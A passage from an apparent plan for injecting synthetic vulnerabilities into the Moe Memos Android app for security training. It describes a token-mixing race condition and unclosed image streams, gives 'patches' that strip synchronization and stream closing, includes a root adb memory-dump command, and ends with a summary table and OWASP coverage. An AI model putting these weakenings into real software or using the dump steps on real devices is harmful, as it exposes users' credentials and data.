- CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
- CWE-366: Race Condition within a Thread
- CWE-567: Unsynchronized Access to Shared Data in a Multithreaded Context

**Bounty Report Description:**

**Summary:**
The AccountService manages multiple user accounts with shared state but lacks proper synchronization when switching accounts or updating tokens. A race condition exists where rapid account switching can cause token mismatches, potentially sending one user's requests with another user's credentials.

**Technical Details:**
The AccountService maintains current account state and repository instances:

```kotlin
// AccountService.kt
private var currentRepository: AbstractMemoRepository? = null
private var currentAccount: MemosAccount? = null

suspend fun switchAccount(accountKey: String) {
    // Race condition: repository and account updated separately
    currentAccount = getAccountByKey(accountKey)
    currentRepository = createRepositoryForAccount(currentAccount)
}
```

If two coroutines call `switchAccount()` concurrently or API requests are made during account switching, the repository might use the wrong account's token.

**Exploitation Scenario:**
1. User has two accounts configured: AccountA and AccountB
2. User rapidly switches from AccountA to AccountB
3. During switch, the following sequence occurs:
   - Thread 1: Starts loading memos for AccountB
   - Thread 2: Updates currentRepository to AccountB's repository
   - Thread 1: Uses old currentAccount (AccountA) token with new repository
4. API request is made with AccountA's token to AccountB's server
5. Server logs show cross-account authentication attempts
6. Potential for accessing wrong account's data if servers are shared

**Impact:**
- Cross-account data leakage
- Authentication errors causing app instability
- Potential unauthorized access if servers accept mismatched tokens
- Privacy violation through account confusion

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/data/service/AccountService.kt` - Account switching logic
- `/app/src/main/java/me/mudkip/moememos/viewmodel/UserStateViewModel.kt` - Account change triggers

**Synthetic Vulnerability Patch:**
Remove synchronization locks or atomic operations when updating current account and repository state.

---

### **VULN-20: Memory Leak of Sensitive Data Through Unclosed Image Streams**

**OWASP Category:** M9 - Insecure Data Storage
**CWE Mappings:**
- CWE-401: Missing Release of Memory after Effective Lifetime
- CWE-772: Missing Release of Resource after Effective Lifetime
- CWE-404: Improper Resource Shutdown or Release

**Bounty Report Description:**

**Summary:**
Image upload operations open file input streams to read image data but fail to properly close these streams in error cases. This causes sensitive image data to remain in memory buffers, potentially accessible through memory dumps or heap analysis.

**Technical Details:**
Image processing code may not properly close streams:

```kotlin
// Hypothetical image upload code
fun uploadImage(imageUri: Uri): Result<Resource> {
    val inputStream = contentResolver.openInputStream(imageUri)
    val bytes = inputStream?.readBytes()
    // If exception occurs here, stream is never closed
    return api.uploadResource(bytes)
    // inputStream.close() is missing or in wrong place
}
```

Without proper `try-finally` or `use` blocks, streams remain open on errors, keeping image data in memory.

**Exploitation Scenario:**
1. User uploads sensitive image (e.g., ID card, credit card photo)
2. Network error occurs during upload
3. InputStream is not closed, image bytes remain in memory
4. Attacker with root access performs memory dump: `adb shell su -c "cat /proc/<PID>/maps"`
5. Analyzes heap memory to find unclosed stream buffers
6. Extracts sensitive image data from memory dump
7. Reconstructs images from raw bytes

**Impact:**
- Sensitive data persistence in memory beyond intended lifetime
- Privacy violation through memory analysis
- Increased attack surface for privileged attackers
- Memory exhaustion DoS if many unclosed streams accumulate

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/viewmodel/MemoInputViewModel.kt` - Image upload logic
- `/app/src/main/java/me/mudkip/moememos/data/repository/MemosV0Repository.kt` - Resource handling

**Synthetic Vulnerability Patch:**
Remove `use` blocks or `try-finally` clauses that ensure streams are closed in all code paths.

---

## Summary Table

| ID | Vulnerability Name | OWASP Category | Severity | Implementation Difficulty |
|----|-------------------|----------------|----------|--------------------------|
| VULN-01 | Plaintext Access Token Storage | M9 | Critical | Low |
| VULN-02 | Cleartext HTTP Traffic | M5 | Critical | Low |
| VULN-03 | User CA Certificate Trust | M5 | High | Low |
| VULN-04 | Missing Certificate Pinning | M5 | High | Medium |
| VULN-05 | Insecure Backup Exposure | M9 | High | Low |
| VULN-06 | Intent Injection via Exported Activity | M8 | Medium | Medium |
| VULN-07 | Predictable Temp File Names | M9 | Medium | Low |
| VULN-08 | IDOR in Memo Operations | M3 | Critical | Medium |
| VULN-09 | XSS via Markdown Rendering | M4 | Medium | Medium |
| VULN-10 | Path Traversal in Resources | M4 | High | Medium |
| VULN-11 | Logcat Data Exposure | M6 | High | Low |
| VULN-12 | Weak Random Generation | M10 | Medium | Low |
| VULN-13 | Weak ProGuard Config | M7 | Medium | Low |
| VULN-14 | Debug Mode in Production | M8 | Critical | Low |
| VULN-15 | Overly Permissive FileProvider | M8 | High | Low |
| VULN-16 | Widget Sensitive Data Exposure | M6 | Medium | Low |
| VULN-17 | Insecure Cookie Policy | M5 | Medium | Low |
| VULN-18 | SSRF via Host Input | M4 | High | Medium |
| VULN-19 | Race Condition in Auth | M3 | Medium | High |
| VULN-20 | Memory Leak of Images | M9 | Low | Medium |

## OWASP Coverage Analysis

- **M1: Improper Credential Usage** - Covered by VULN-01, VULN-11
- **M2: Inadequate Supply Chain Security** - Not directly covered (would require malicious dependency injection)
- **M3: Insecure Authentication/Authorization** - Covered by VULN-08, VULN-19
- **M4: Insufficient Input/Output Validation** - Covered by VULN-09, VULN-10, VULN-18
- **M5: Insecure Communication** - Covered by VULN-02, VULN-03, VULN-04, VULN-17
- **M6: Inadequate Privacy Controls** - Covered by VULN-11, VULN-16
- **M7: Insufficient Binary Protection** - Covered by VULN-13
- **M8: Security Misconfiguration** - Covered by VULN-06, VULN-14, VULN-15
- **M9: Insecure Data Storage** - Covered by VULN-01, VULN-05, VULN-07, VULN-20
- **M10: Insufficient Cryptography** - Covered by VULN-12

**Coverage: 9/10 OWASP categories** (M2 requires supply chain manipulation beyond code changes)

## Implementation Priority Recommendations

**High Priority (Easy + High Impact):**
1. VULN-01 - Plaintext token storage
2. VULN-02 - Cleartext traffic
3. VULN-05 - Backup exposure
4. VULN-11 - Logcat leakage
5. VULN-14 - Debug mode enabled

**Medium Priority (Good Learning Examples):**
6. VULN-08 - IDOR vulnerability
7. VULN-10 - Path traversal
8. VULN-15 - FileProvider misconfiguration
9. VULN-18 - SSRF attacks

**Advanced (Complex Exploitation):**
10. VULN-04 - Certificate pinning bypass
11. VULN-19 - Race conditions
12. VULN-09 - XSS in Compose (unique to modern Android)
